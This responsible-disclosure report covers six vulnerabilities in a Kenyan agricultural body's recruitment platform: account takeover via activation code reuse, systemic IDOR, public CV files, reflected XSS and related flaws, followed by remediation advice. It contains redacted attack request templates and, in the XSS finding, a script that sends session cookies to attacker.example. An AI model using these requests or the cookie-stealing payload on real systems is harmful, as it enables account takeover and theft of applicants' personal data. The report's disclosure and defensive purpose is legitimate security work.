# Account Takeover and Systemic IDOR in a National Agricultural Body's Recruitment Platform

## Executive Summary

In June 2026, while applying for a job through an online recruitment platform operated by a major Kenyan agricultural organisation, the researcher identified a security anomaly that prompted a structured responsible disclosure assessment.

The assessment confirmed six vulnerabilities across the platform, including a **Critical** authentication bypass that allows any registered applicant to take over any other applicant's account with no victim interaction required. A systemic broken access control flaw across the platform's profile management endpoints compounded the risk, enabling enumeration and manipulation of applicant personal data — including national ID numbers, employment histories, academic qualifications, and uploaded CV documents — using an email address as the only required identifier.

All findings were confirmed with working evidence. No data was extracted, no user accounts other than the researcher's own were accessed or harmed, and findings were disclosed privately and directly to the organisation before any publication.

The organisation acknowledged the disclosure within 24 hours and convened a technical review meeting within the week.

## Engagement Scope and Methodology

### Target Overview

| Field | Detail |
|---|---|
| Target | Online recruitment platform operated by a national Kenyan agricultural body |
| Platform Type | Custom PHP web application on Apache 2.4.67 |
| Engagement Type | Self-initiated responsible disclosure |
| Scope | All functionality accessible via the recruitment subdomain |
| Authentication | Researcher registered two applicant accounts |
| CMS (Main Domain) | WordPress |
| Discovery Context | Found while using the platform as a genuine job applicant |

The platform handles the full recruitment lifecycle: job listings, applicant registration, profile management (qualifications, employment history, referees), CV upload, and job application submission.

### Methodology

The assessment followed a structured five-phase approach, operating strictly within the researcher's own registered accounts except where access control failures were demonstrated in a controlled and non-destructive manner.

| Phase | Focus |
|---|---|
| Recon / Enumeration | Platform fingerprinting, stack identification, endpoint discovery, registration and activation flow analysis |
| Analysis | Parameter mapping, session behaviour, file upload validation, password reset flow analysis |
| Exploitation | Confirmed cross-account activation code reuse, IDOR chain validation, XSS confirmation |
| Chain Validation | End-to-end attack chain construction from email address to full account takeover |
| Closure | Reporting, executive briefing, and coordinated disclosure |

**Tools used:** Caido (proxy and request interception), manual browser testing, curl, webhook.site (XSS confirmation), Nmap (supplementary recon on additional subdomains in scope).

**Ground rules applied throughout:**
- No access to accounts not controlled by the researcher
- No data extraction, retention, or third-party sharing
- Testing limited to confirming vulnerability existence
- No automated scanning or denial-of-service testing

## Findings

### F-01 — Account Takeover via Cross-Account Activation Code Reuse

#### Description

The password reset endpoint does not validate that the activation code submitted in a reset request belongs to the account being reset. An authenticated attacker can generate a valid activation code for their own account and use it to overwrite the password of any other account on the platform. Activation codes are not invalidated after use and have no expiry window.

**Severity: Critical**
**CVSS 3.1: 9.8** — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

#### Technical Detail

The password reset endpoint accepts three key parameters: a `personid` (sequential integer identifying the target account), an `activationcode` (numeric token issued via email), and `appid` (mirrors personid in the POST body). The server validates that the activation code exists in the database but does not verify that it was issued for the account identified by `personid`. There is no session-to-account ownership check at the point of reset execution.

**Request:**
```http
POST [REDACTED]/[REDACTED]/pwdreset.php?personid=XXXXX&activationcode=XXXXXXXX
Content-Type: application/x-www-form-urlencoded

password=AttackerPassword&checker=1&password1=AttackerPassword&appid=XXXXX&MM_insert=form1
```

Where `personid` and `appid` are the **victim's** account ID and `activationcode` is from the **attacker's own** reset email.

The server returns a redirect to the login page. The victim's password is now the attacker-controlled value.

**Sub-finding:** The same activation code successfully resets the same account on a second and subsequent submission — confirming no single-use enforcement and no expiry mechanism.

**Account ID enumeration:** Account IDs follow a sequential integer pattern, making enumeration of valid target accounts trivial without any additional information source.

#### Business Impact

Full account takeover of any registered applicant with no victim interaction. The attacker gains complete access to the victim's profile, personal data, CV document, job applications, and all associated PII. At scale, every registered applicant on the platform is vulnerable. The attack requires only one registered account and a target's email address (to resolve their account ID via the IDOR finding below).

#### Scope Note

Demonstrated between two researcher-controlled accounts. Account IDs for victim accounts were not enumerated beyond confirming the sequential pattern. No real applicant accounts were accessed.

### F-02 — Systemic IDOR Across Profile Management Endpoints

#### Description

The platform's profile management API does not enforce server-side ownership validation on any endpoint. Any authenticated user can read, write, or delete profile data belonging to any other registered applicant by supplying a target identifier in the request body. Eight endpoints are affected, covering all applicant profile data categories.

**Severity: High**
**CVSS 3.1: 8.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`

#### Technical Detail

Two distinct attack patterns are present across the `/parts/` endpoint family:

**Read pattern — email address sufficient:**

The delete endpoints execute two sequential queries: a DELETE using the supplied `id`, and a SELECT using the supplied `CreatedBy` email to return remaining records. When `id` is omitted, the DELETE is skipped, but the SELECT executes against the supplied email — returning all records for the target account including their `personid`, qualification details, and associated metadata.

```http
POST [REDACTED]/[REDACTED]/parts/del_acad_q.php
Content-Type: application/x-www-form-urlencoded

id=&CreatedBy=target@email.com
```

Response includes the victim's academic records, personid, and email — requiring no prior knowledge beyond the email address.

**Write pattern — personid sufficient:**

The save endpoints accept an `Applicant` field set to any `personid` with no ownership check. False records are inserted into the target's profile. The response confirms insertion and returns the victim's existing records for the same category, leaking their real data.

```http
POST [REDACTED]/[REDACTED]/parts/save_referee.php
Content-Type: application/x-www-form-urlencoded

Refereename=Fabricated+Referee&Employer=False+Institution&Tel=0700000000
&Email=fake@example.com&CreatedBy=attacker@email.com&Applicant=XXXXX
```

**Destructive pattern:**

Supplying a valid record `id` belonging to another user causes permanent deletion of that record with no ownership check.

**Confirmed affected endpoints:**

| Endpoint | Access Type | Identifier Required |
|---|---|---|
| `[REDACTED]/parts/del_acad_q.php` | Read + Destructive Delete | Email |
| `[REDACTED]/parts/del_prof_q.php` | Read + Destructive Delete | Email |
| `[REDACTED]/parts/del_employment.php` | Read + Destructive Delete | Email |
| `[REDACTED]/parts/del_membership.php` | Read + Destructive Delete | Email |
| `[REDACTED]/parts/save_referee.php` | Write | Account ID |
| `[REDACTED]/parts/save_acad_q.php` | Write | Account ID |
| `[REDACTED]/parts/save_professional_q.php` | Write | Account ID |
| `[REDACTED]/parts/save_employment.php` | Write | Account ID |

#### Business Impact

An email-sufficient read vector means that any applicant whose email address is publicly visible (LinkedIn, professional directories, published correspondence) is fully exposed. The write vector enables data integrity attacks — a competing applicant could fabricate or destroy another's profile entries without detection. The email-to-personid resolution provided by this finding directly enables the Critical account takeover chain.

#### Scope Note

Read and write IDOR demonstrated against researcher-controlled accounts only. No third-party applicant data was accessed. Destructive delete was confirmed on researcher's own records only.

### F-03 — Unauthenticated Access to Uploaded CV Documents

#### Description

CV files uploaded by applicants are stored on the web server and served directly from a public path with no authentication or authorisation check. Any party who knows or can derive a file's URL can download the document without being logged in.

**Severity: Medium**
**CVSS 3.1: 5.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

#### Technical Detail

Uploaded files are served from a publicly accessible directory. The platform's error messages reveal the expected filename convention (`Year_FullName.pdf`), which reduces the search space for targeted retrieval. Directory listing on the upload path is disabled (HTTP 403), but individual files are served without restriction.

```http
GET [REDACTED]/[REDACTED]/CV-Name-2026.pdf
(no Cookie or Authorization header)

HTTP/1.1 200 OK
Content-Type: application/pdf
[CV document returned]
```

#### Business Impact

CV documents submitted to a recruitment platform routinely contain national ID numbers, home addresses, phone numbers, employment history, educational background, and personal references — a near-complete identity profile. Access requires only filename knowledge, which is reduced to a derivation problem when the applicant's name is known (obtainable from the IDOR finding).

#### Scope Note

Confirmed on researcher's own uploaded CV only. No third-party CV files were accessed.

### F-04 — Reflected XSS on Error Page with Session Cookie Exposure

#### Description

The platform's error page reflects a URL parameter directly into the page response without sanitisation. Arbitrary JavaScript executes in the victim's browser. The session cookie lacks `HttpOnly` and `Secure` flags, confirmed to be readable and exfiltrable by the injected script.

**Severity: Medium**
**CVSS 3.1: 6.1** — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

#### Technical Detail

The `msg` GET parameter on the error page is echoed into an `<h4>` tag without output encoding. A custom sanitiser targets only PHP open and close tags (`<?` and ?>`), leaving HTML and JavaScript entirely unfiltered. All standard XSS vectors execute.

```
[REDACTED]/[REDACTED]/error.php?msg=<script>fetch('https://attacker.example/x?c='+document.cookie)</script>
```

During testing, the `PHPSESSID` cookie value was received at the attacker-controlled webhook, confirming cookie theft is achievable. The `HttpOnly` flag was absent on the session cookie, permitting JavaScript access. The `Secure` flag was also absent.

An Apache-level request filter blocks specific PHP execution function names (`system(`, `exec(`, `shell_exec(` etc.), but this does not affect JavaScript injection.

#### Business Impact

An attacker can craft a deceptive link to the legitimate recruitment platform domain that, when clicked by a logged-in applicant, silently steals their session cookie and grants the attacker full session access. The recruitment context (applicants expecting email notifications about their applications) makes social engineering delivery realistic.

#### Scope Note

XSS execution and cookie exfiltration confirmed using researcher-controlled accounts and a researcher-controlled webhook endpoint only.

### F-05 — Activation Tokens Have No Expiry and Are Not Invalidated After Use

#### Description

Password reset activation codes issued by the platform are not cancelled after successful use and have no observed expiry window. A code used to complete a reset remains valid for subsequent submissions indefinitely.

**Severity: Medium**
**CVSS 3.1: 5.9** — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`

#### Technical Detail

A reset code was used to complete a password reset. The same code was then submitted again to the reset endpoint — the server accepted it and completed a second reset. Testing at 48-hour and 96-hour intervals confirmed the code remained valid throughout. No expiry timestamp or single-use flag was observed in the reset link or server response.

This compounds F-01 (account takeover): any historical activation code that was ever intercepted, observed, or leaked (via email forwarding, referrer header, browser history) remains usable indefinitely.

#### Business Impact

Any activation code ever issued — including registration activation links sent at account creation — is a permanent credential for account password reset if the cross-account reset flaw is unpatched. The residual risk after partial patching is higher than it would be with proper token management.

#### Scope Note

Confirmed on researcher-controlled accounts only.

### F-06 — National ID Uniqueness Constraint Enforced Client-Side Only

#### Description

The platform enforces national ID uniqueness at the frontend form validation layer only. A direct POST request to the profile update endpoint bypasses this check and successfully inserts a duplicate national ID into the database.

**Severity: Low / Informational**

#### Technical Detail

```http
POST [REDACTED]/[REDACTED]/parts/save_mydetails.php
Content-Type: application/x-www-form-urlencoded

firstname=...&nationalid=XXXXXXXXXX&email=attacker@email.com

Response: {"message":{"saved":"Personal details have been updated successfully."}}
```

After submission, two accounts in the database share the same national ID value.

#### Business Impact

If the platform uses national ID as an identity verification key (e.g. for de-duplication of applicants or background checking), this failure could allow identity spoofing or duplicate account creation under a real person's ID number.

#### Scope Note

Demonstrated using the researcher's own national ID across two researcher-controlled accounts. No third-party identity data was used.

## Architecture Intelligence

> *This section summarises the platform's technical stack and security posture as observed during the assessment. It is included as intelligence context, not as a finding in itself.*

| Component | Detail |
|---|---|
| Recruitment platform stack | PHP / Apache 2.4.67 |
| Main domain CMS | WordPress |
| Database | MySQL (inferred from response behaviour) |
| Request filtering | Apache-level block on PHP execution function names |
| Input sanitisation (main app) | HTML entity encoding — effective against XSS in primary flows |
| Input sanitisation (error page) | PHP tag replacement only — JavaScript unfiltered |
| File upload validation | Server-side extension whitelist (doc, docx, pdf) — robust |
| Session cookie flags | `HttpOnly` absent, `Secure` absent |
| Password storage | No evidence of plaintext or weak hashing |
| Account ID scheme | Sequential integers — enumerable |
| Activation code scheme | 8-digit numeric — no observed predictability pattern |
| Activation code lifecycle | No expiry, no single-use enforcement |
| Access control model | No session-to-resource ownership validation on any `/parts/` endpoint |

**Observed additional in-scope subdomains:**

| Subdomain | Description | Status |
|---|---|---|
| `[REDACTED]` | Management portal (clients, admins, files, secrets) | Authenticated — no self-registration; no foothold obtained |
| `[REDACTED]` | Survey platform | Unauthenticated page leaks administrative contact email |

**Security posture summary:**

The platform demonstrates strong injection defences — the combination of entity encoding and Apache-level function blocking effectively defeats XSS and PHP injection attempts across the main application. Its critical weakness is an almost complete absence of authorisation logic: every endpoint that accepts a user-supplied identifier processes the request without verifying that the authenticated session is entitled to access the referenced resource.

## Observations on Program Quality

This engagement was a self-initiated responsible disclosure against an organisation with no published Vulnerability Disclosure Policy. Several observations are worth recording for the portfolio record.

**What worked well:**
- The organisation's ICT leadership responded substantively within 24 hours of contact, which is faster than many organisations with formal programmes.
- A technical review meeting was proposed and scheduled promptly, indicating genuine engagement rather than dismissal.
- The ICT contact was candid about the platform's planned relaunch, which provided useful context for scoping remediation advice.

**What was challenging:**
- The absence of a published security contact or VDP required multi-channel outreach (email to named individuals, secondary escalation via a subsidiary contact). The initial email channel was slow to be actioned.
- Without a formal scope document, the researcher had to make and document scope judgements in real time (e.g. subsidiary subdomains, shared hosting).
- There is no formal remediation tracking mechanism — follow-up depends on the goodwill and responsiveness of the ICT team rather than any documented process.

**Programme gap — no VDP:**
This engagement would have been smoother, and the researcher's legal position clearer, if the organisation had a published VDP. The recommendation to establish one is included in the technical report. For organisations of this scale handling significant volumes of personal data, a VDP is a low-cost risk management tool with meaningful value.

## Recommendations

### Immediate (Before Next Business Day)

1. **Fix the password reset endpoint** — validate server-side that the submitted activation code was issued for the `personid` being reset. Reject mismatches with an appropriate error. Invalidate codes immediately after successful use and implement a 60-minute expiry window.

2. **Enforce session ownership on all `/parts/` endpoints** — derive the target account identifier from the authenticated session server-side. Remove `CreatedBy` and `Applicant` from client-controlled input entirely.

### Short-Term (Within Two Weeks)

3. **Move CV files behind an authenticated download handler** — files should not be served directly from a public web path. Implement a PHP handler that validates session identity and file ownership before serving the document.

4. **Apply output encoding to the error page** — `htmlspecialchars($_GET['msg'], ENT_QUOTES, 'UTF-8')` is the complete fix. Set `HttpOnly` and `Secure` flags on the session cookie.

5. **Move national ID uniqueness enforcement server-side** — the database constraint or a server-side check before insert/update.

### Before Platform Relaunch

6. **Adopt least-privilege as a design principle** — every API endpoint in the new platform should verify session-to-resource ownership as a baseline requirement, not an afterthought.

7. **Commission an independent security review** before the new platform goes live, covering the endpoint family patterns identified in this assessment.

8. **Publish a Vulnerability Disclosure Policy** — a documented, publicly accessible process for researchers to report security issues. This reduces legal ambiguity for researchers and ensures the organisation has a defined intake process for future disclosures.
